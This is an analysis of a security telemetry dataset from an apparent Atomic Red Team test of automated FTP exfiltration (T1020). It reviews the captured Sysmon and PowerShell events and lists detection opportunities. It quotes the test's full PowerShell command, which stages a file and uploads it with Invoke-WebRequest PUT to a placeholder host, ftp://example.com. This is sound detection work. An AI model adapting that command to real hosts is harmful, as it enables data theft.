# T1020-2: Automated Exfiltration — Exfiltration via Encrypted FTP

## Technique Context

T1020 Automated Exfiltration covers scenarios where adversaries use scripted or programmatic methods to move data out of a compromised environment, typically as part of a repeatable, scheduled, or autonomous process. The FTP variant simulates a common data staging and transfer workflow: create a file containing sensitive or collected data, then use an FTP-capable client to upload it to an attacker-controlled server. PowerShell's `Invoke-WebRequest` cmdlet supports FTP PUT operations alongside its more commonly discussed HTTP capabilities, making it a convenient tool for this purpose.

Detection teams focus on several signals for this class of behavior: outbound FTP connections on port 21 (or 990 for FTPS) from non-FTP-client processes, PowerShell writing files to staging directories before initiating network transfers, and the combination of `Set-Content` (file write) followed by `Invoke-WebRequest` or `New-Object Net.FtpWebRequest` in close temporal proximity. The `Get-Credential` call in this test is notable — in real attacks, credentials are typically hardcoded or retrieved from a vault rather than prompted, but the pattern of instantiating credential objects before network transfers is still a detection point.

This test uses a fixed staging path (`C:\temp\T1020__FTP_sample.txt`) and a hardcoded dummy target (`ftp://example.com`) with placeholder credentials, so no actual exfiltration occurs. The value is in the process creation and PowerShell telemetry it generates.

## What This Dataset Contains

The dataset spans approximately two minutes (23:01:04–23:03:11 UTC on 2026-03-14) and totals 171 events across four channels. The longer duration reflects the FTP connection attempt timing out against `example.com` before the cleanup phase begins.

The critical evidence is the process chain captured in Sysmon EID 1 and Security EID 4688. Parent PowerShell (PID 1796) spawns a child PowerShell (PID 3536) with the full command line: `"powershell.exe" & {$sampleData = "Sample data for exfiltration test" Set-Content -Path "C:\temp\T1020__FTP_sample.txt" -Value $sampleData $ftpUrl = "ftp://example.com" $creds = Get-Credential -Credential "[user:password]" Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile "C:\temp\T1020__FTP_sample.txt" -Credential $creds}`. The full script is visible in the Sysmon EID 1 command line field.

Sysmon EID 7 image load events document the child PowerShell loading `urlmon.dll` (OLE32 Extensions for Win32, the DLL powering `Invoke-WebRequest`'s HTTP/FTP stack), the .NET CLR components (`mscoree.dll`, `mscoreei.dll`, `clr.dll`, `mscorlib.ni.dll`, `clrjit.dll`), and the Defender MpOAV.dll and MpClient.dll (present even with real-time protection disabled — the scan-on-access interface remains registered). The urlmon.dll load is the most operationally relevant since it confirms a network transfer was initiated.

Sysmon EID 10 shows the parent PowerShell accessing both the child PowerShell process and the `whoami.exe` pre/post-check processes with full access rights (0x1FFFFF), consistent with the ART test framework's job management pattern.

Compared to the defended version (41 Sysmon events, 22 Security, 34 PowerShell, 6 TaskScheduler), this undefended dataset has roughly the same Sysmon count (41) and fewer Security events (5), suggesting the defended run's larger Security channel count was driven by Defender's response activity.

The PowerShell channel contains 128 events (115 EID 4104, 13 EID 4103), but all EID 4104 content in the sample set is test framework boilerplate. The actual exfiltration script block is in the full dataset but was not captured in the 20-event sample. The defended version's EID 4103 captured the `Set-Content` parameter bindings (`ParameterBinding(Set-Content): name="Path"; value="C:\temp\T1020__FTP_sample.txt"`); similar detail should be present in this undefended run's full EID 4103 records.

## What This Dataset Does Not Contain

There are no Sysmon EID 3 network connection events capturing the FTP connection to `ftp://example.com`. This is a significant gap — if the network connection was attempted, it would appear as an outbound TCP connection to port 21. The connection may have been too short-lived or the address may have resolved to a non-routable address before Sysmon captured it. No Sysmon EID 11 file creation event for `C:\temp\T1020__FTP_sample.txt` appears in the samples (though it may exist in the full dataset given the 10 EID 11 events recorded). There are no DNS query events (Sysmon EID 22) for `example.com`, which is surprising if `Invoke-WebRequest` was called with an FTP URL — this may indicate the connection failed before DNS resolution.

## Assessment

This dataset captures the staging and invocation of a PowerShell FTP exfiltration workflow. The full command line is present in both Sysmon EID 1 and Security EID 4688, including the `ftp://example.com` destination URL and file staging path. The urlmon.dll image load event confirms a network transfer was attempted. For detection engineering purposes, this dataset is useful for developing rules that combine file staging (Set-Content to a temp path) with network transfer cmdlets in PowerShell, and for hunting PowerShell command lines containing FTP URLs or `Invoke-WebRequest` with non-HTTP schemes. The absence of EID 3 network events limits its usefulness for network-layer detection development, but the process creation and image load evidence is clean and actionable.

## Detection Opportunities Present in This Data

1. **Sysmon EID 1 / EID 4688 — PowerShell spawning PowerShell with FTP URL**: The child PowerShell command line contains `ftp://example.com` directly in the command line argument. Searching for FTP scheme (`ftp://`) in process command lines is a reliable indicator of automated FTP transfers from scripting engines.

2. **Sysmon EID 1 / EID 4688 — Invoke-WebRequest with PUT method**: The `-Method Put` argument in an `Invoke-WebRequest` call in a PowerShell process command line is unusual for normal web browsing or download activity and indicates an upload operation.

3. **Sysmon EID 7 — urlmon.dll load in PowerShell followed by process access**: PowerShell loading `urlmon.dll` combined with a subsequent cross-process access to a child PowerShell process is a behavioral sequence associated with web-request-based data transfer operations.

4. **EID 4104 — script block analysis for Set-Content + Invoke-WebRequest proximity**: In the full dataset, the script block containing `Set-Content` (writing to `C:\temp\T1020__FTP_sample.txt`) immediately followed or accompanied by `Invoke-WebRequest` with FTP is a compound behavioral indicator for staged-then-transferred data patterns.

5. **EID 4103 — module logging for Set-Content parameter bindings**: Module logging captures the exact path and content written by `Set-Content`. Monitoring for `Set-Content` writes to temp-like directories where the filename contains a technique or timestamp pattern (here: `T1020__FTP_sample.txt`) provides a staging detection opportunity.
